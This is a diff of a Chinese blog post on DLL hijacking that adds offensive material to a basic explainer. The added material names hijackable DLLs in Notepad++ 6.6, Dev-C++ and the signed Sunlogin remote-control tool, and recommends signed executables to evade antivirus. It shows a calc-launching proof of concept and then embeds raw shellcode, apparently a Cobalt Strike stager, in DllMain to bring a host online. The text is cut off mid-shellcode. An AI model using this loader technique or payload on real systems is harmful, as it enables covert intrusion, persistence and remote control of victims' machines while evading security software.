@@ -16,28 +16,42 @@
   <meta name="author" content="ironman">
   <meta name="keywords" content="">
   
-    <meta name="description" content="DLL挟持分享1 什么是dll动态链接库的目的就是使软件的体积变小，把功能封装到dll文件里，当exe启动的时候可以动态的调用dll文件。 编译的时候使用x86编译只能32位的程序去用，x64的编译只能x64的程序能用 简单理解一下DLL  123456789101112131415161718&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.">
+    <meta name="description" content="DLL挟持分享1 什么是dll动态链接库的目的就是使软件的体积变小，把功能封装到dll文件里，比如当qq软件进行更新时只需要去升级dll文件就可以，而不用从源码上去修改。 当exe启动的时候可以动态的调用dll文件。 编译的时候使用x86编译只能32位的程序去用，x64的编译只能x64的程序能用 简单理解一下DLL  123456789101112131415161718&#x2F;&#x2F; dllmain.cp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DLL挟持">
-<meta property="og:url" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/index.html">
+<meta property="og:url" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/index.html">
 <meta property="og:site_name" content="Ironman">
-<meta property="og:description" content="DLL挟持分享1 什么是dll动态链接库的目的就是使软件的体积变小，把功能封装到dll文件里，当exe启动的时候可以动态的调用dll文件。 编译的时候使用x86编译只能32位的程序去用，x64的编译只能x64的程序能用 简单理解一下DLL  123456789101112131415161718&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.">
+<meta property="og:description" content="DLL挟持分享1 什么是dll动态链接库的目的就是使软件的体积变小，把功能封装到dll文件里，比如当qq软件进行更新时只需要去升级dll文件就可以，而不用从源码上去修改。 当exe启动的时候可以动态的调用dll文件。 编译的时候使用x86编译只能32位的程序去用，x64的编译只能x64的程序能用 简单理解一下DLL  123456789101112131415161718&#x2F;&#x2F; dllmain.cp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled.png">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%201.png">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%202.png">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%203.png">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%204.png">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%205.png">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%206.png">
-<meta property="og:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%207.png">
-<meta property="article:published_time" content="2023-10-10T23:03:00.000Z">
-<meta property="article:modified_time" content="2023-10-11T15:47:34.836Z">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%201.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%202.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%203.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%204.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%205.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%206.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%207.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%208.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%209.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2010.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2011.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2012.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2013.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2014.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2015.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2016.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2017.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2018.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2019.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2020.png">
+<meta property="og:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2021.png">
+<meta property="article:published_time" content="2023-10-12T00:40:22.000Z">
+<meta property="article:modified_time" content="2023-10-12T08:42:31.113Z">
 <meta property="article:author" content="ironman">
 <meta property="article:tag" content="免杀">
 <meta property="article:tag" content="DLL挟持">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled.png">
+<meta name="twitter:image" content="http://example.com/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -220,8 +234,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-11 07:03" pubdate>
-          2023年10月11日 早上
+        <time datetime="2023-10-12 08:40" pubdate>
+          2023年10月12日 早上
         </time>
       </span>
     
@@ -232,7 +246,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          6.8k 字
         
       </span>
     
@@ -243,7 +257,7 @@
         
         
         
-          16 分钟
+          57 分钟
         
       </span>
     
@@ -285,40 +299,81 @@
             
               <div class="markdown-body">
                 
-                <h1 id="DLL挟持分享"><a href="#DLL挟持分享" class="headerlink" title="DLL挟持分享"></a>DLL挟持分享</h1><h1 id="1-什么是dll"><a href="#1-什么是dll" class="headerlink" title="1 什么是dll"></a>1 什么是dll</h1><p>动态链接库的目的就是使软件的体积变小，把功能封装到dll文件里，当exe启动的时候可以动态的调用dll文件。</p>
+                <h1 id="DLL挟持分享"><a href="#DLL挟持分享" class="headerlink" title="DLL挟持分享"></a>DLL挟持分享</h1><h1 id="1-什么是dll"><a href="#1-什么是dll" class="headerlink" title="1 什么是dll"></a>1 什么是dll</h1><p>动态链接库的目的就是使软件的体积变小，把功能封装到dll文件里，比如当qq软件进行更新时只需要去升级dll文件就可以，而不用从源码上去修改。</p>
+<p>当exe启动的时候可以动态的调用dll文件。</p>
 <p>编译的时候使用x86编译只能32位的程序去用，x64的编译只能x64的程序能用</p>
 <p>简单理解一下DLL</p>
-<p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br>#include <span class="hljs-string">&quot;pch.h&quot;</span><br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">( HMODULE hModule, //dll加载入内存中的起点（句柄）</span><br><span class="hljs-params">                       DWORD  ul_reason_for_call, //dll加载的原因</span><br><span class="hljs-params">                       LPVOID lpReserved //</span><br><span class="hljs-params">                     )</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>添加导出函数</p>
 <p>首先先添加def文件</p>
-<p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%201.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%201.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">EXPORTS<br>fun1<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%202.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%203.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%202.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%203.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
 <p>调用导出函数</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">#include&lt;stdio.h&gt;<br>#include&lt;Windows.h&gt;<br><br>typedef <span class="hljs-title function_">int</span><span class="hljs-params">(__stdcall* pfun)</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">HMODULE</span> <span class="hljs-variable">dll1</span> <span class="hljs-operator">=</span> LoadLibraryA(<span class="hljs-string">&quot;C:\\Users\\ws\\source\\repos\\Dll3\\Debug\\dll3.dll&quot;</span>);<br>	<span class="hljs-comment">//通过函数名调用</span><br>	<span class="hljs-type">pfun</span> <span class="hljs-variable">wstest</span> <span class="hljs-operator">=</span> (pfun)GetProcAddress(dll1, <span class="hljs-string">&quot;funtest&quot;</span>);<br>	<span class="hljs-comment">//通过序号调用</span><br>	<span class="hljs-comment">//pfun wstest = (pfun)GetProcAddress(dll1, (LPCSTR)2);</span><br>	printf(<span class="hljs-string">&quot;%d&quot;</span>, wstest());<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h1 id="DLL利用场景"><a href="#DLL利用场景" class="headerlink" title="DLL利用场景"></a>DLL利用场景</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/650357223?utm_id=0">揪出隐藏的内鬼“DLL白利用”</a></p>
 <p>权限维持</p>
-<p>白加黑上线</p>
-<h1 id="2-DLL加载顺序"><a href="#2-DLL加载顺序" class="headerlink" title="2 DLL加载顺序"></a>2 DLL加载顺序</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span> 进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；<br><span class="hljs-number">2</span> 系统目录（即%windir%system32）；<br><span class="hljs-number">3</span> <span class="hljs-number">16</span>位系统目录（即%windir%system）；<br><span class="hljs-number">4</span> Windows目录（即%windir%）；<br><span class="hljs-number">5</span> 当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；<br><span class="hljs-number">6</span> PATH环境变量中的各个目录；<br></code></pre></td></tr></table></figure>
+<p>白加黑上线（寻找带数字签名的exe，会过掉一部分杀软拦截）</p>
+<h1 id="2-DLL加载顺序"><a href="#2-DLL加载顺序" class="headerlink" title="2 DLL加载顺序"></a>2 DLL加载顺序</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span> 进程对应的应用程序所在目录（可理解为程序安装目录比如C:/ProgramFile/suTorrent）；<br><span class="hljs-number">2</span> 系统目录（即%windir%system32）；<br><span class="hljs-number">3</span> <span class="hljs-number">16</span>位系统目录（即%windir%system）；<br><span class="hljs-number">4</span> Windows目录（即%windir%）；<br><span class="hljs-number">5</span> 当前目录（运行的某个文件所在目录，比如C:/Document/sandSettings/Administrator/Desktop/test）；<br><span class="hljs-number">6</span> PATH环境变量中的各个目录；<br></code></pre></td></tr></table></figure>
 
 <h1 id="3-被保护的DLL"><a href="#3-被保护的DLL" class="headerlink" title="3 被保护的DLL"></a>3 被保护的DLL</h1><p>在注册表</p>
 <p>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">kernel32.dll<br>wow64cpu.dll<br>wowarmhw.dll<br>xtajit.dll<br>advapi32.dll<br>clbcatq.dll<br>combase.dll<br>COMDLG32.dll<br>coml2.dll<br>difxapi.dll<br>gdi32.dll<br>gdiplus.dll<br>IMAGEHLP.dll<br>IMM32.dll<br>MSCTF.dll<br>MSVCRT.dll<br>NORMALIZ.dll<br>NSI.dll<br>ole32.dll<br>OLEAUT32.dll<br>PSAPI.DLL<br>rpcrt4.dll<br>sechost.dll<br>Setupapi.dll<br>SHCORE.dll<br>SHELL32.dll<br>SHLWAPI.dll<br>user32.dll<br>WLDAP32.dll<br>wow64.dll<br>wow64base.dll<br>wow64con.dll<br>wow64win.dll<br>WS2_32.dll<br>xtajit64.dll<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%204.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%204.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
 <h1 id="4-DLL使用的工具"><a href="#4-DLL使用的工具" class="headerlink" title="4 DLL使用的工具"></a>4 DLL使用的工具</h1><h2 id="1-X64dbug"><a href="#1-X64dbug" class="headerlink" title="1 X64dbug"></a>1 X64dbug</h2><p>打开进程之后在符号一栏中可以看到调用的dll文件</p>
-<p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%205.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%205.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
 <h2 id="2-ProcessExplorer"><a href="#2-ProcessExplorer" class="headerlink" title="2 ProcessExplorer"></a>2 ProcessExplorer</h2><p>打开文件右上角搜索</p>
-<p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%206.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<h1 id="3-ProcessMonitor"><a href="#3-ProcessMonitor" class="headerlink" title="3 ProcessMonitor"></a>3 ProcessMonitor</h1><p><img src="/2023/10/11/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%207.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<h1 id="5-如何发现可用DLL"><a href="#5-如何发现可用DLL" class="headerlink" title="5 如何发现可用DLL"></a>5 如何发现可用DLL</h1><p>以notepad++6.6 为例</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%206.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h1 id="3-ProcessMonitor"><a href="#3-ProcessMonitor" class="headerlink" title="3 ProcessMonitor"></a>3 ProcessMonitor</h1><p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%207.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h1 id="5-快速发现可用DLL"><a href="#5-快速发现可用DLL" class="headerlink" title="5 快速发现可用DLL"></a>5 快速发现可用DLL</h1><p>以notepad++6.6 为例</p>
 <p><a target="_blank" rel="noopener" href="https://notepad-plus-plus.org/downloads/v6.6.6/">https://notepad-plus-plus.org/downloads/v6.6.6/</a></p>
-<h1 id="6-DLL挟持具体实现"><a href="#6-DLL挟持具体实现" class="headerlink" title="6 DLL挟持具体实现"></a>6 DLL挟持具体实现</h1><h1 id="7-DLL挟持上线msf"><a href="#7-DLL挟持上线msf" class="headerlink" title="7 DLL挟持上线msf"></a>7 DLL挟持上线msf</h1>
+<h2 id="1、找不存在的DLL"><a href="#1、找不存在的DLL" class="headerlink" title="1、找不存在的DLL"></a>1、找不存在的DLL</h2><p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%208.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%209.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>通过这种方式寻找的DLL大概率可用</p>
+<h1 id="6-DLL挟持具体实现"><a href="#6-DLL挟持具体实现" class="headerlink" title="6 DLL挟持具体实现"></a>6 DLL挟持具体实现</h1><p>弹计算机</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br># include <span class="hljs-string">&quot;pch.h&quot;</span><br># include &lt;stdlib.h&gt;<br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule,</span><br><span class="hljs-params">    DWORD  ul_reason_for_call,</span><br><span class="hljs-params">    LPVOID lpReserved</span><br><span class="hljs-params">)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        system(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>确定其是多少位的</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2010.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h3 id="1、notepad-6-6"><a href="#1、notepad-6-6" class="headerlink" title="1、notepad++6.6"></a>1、notepad++6.6</h3><p>SciLexer.dll</p>
+<p>Msimg32.DLL</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2011.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2012.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h3 id="2、devcpp"><a href="#2、devcpp" class="headerlink" title="2、devcpp"></a>2、devcpp</h3><p>SHFOLDER.DLL</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2013.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h2 id="3-向日葵远控"><a href="#3-向日葵远控" class="headerlink" title="3 向日葵远控"></a>3 向日葵远控</h2><p>白加黑最好选择有数字签名的，此处需要注意向日葵为64位程序</p>
+<p>可用白dll</p>
+<p>WindowsCodecs.dll</p>
+<p><img src="/2023/10/12/DLL%E6%8C%9F%E6%8C%81%E5%88%86%E4%BA%AB%20e50a3a78977c4461b7e199951ad744b0/Untitled%2014.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>利用向日葵上线CS</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br>#include <span class="hljs-string">&quot;pch.h&quot;</span><br>#include <span class="hljs-string">&quot;framework.h&quot;</span><br>#include &lt;Windows.h&gt;<br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule,</span><br><span class="hljs-params">    DWORD  ul_reason_for_call,</span><br><span class="hljs-params">    LPVOID lpReserved</span><br><span class="hljs-params">)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    &#123;<br>        unsigned <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d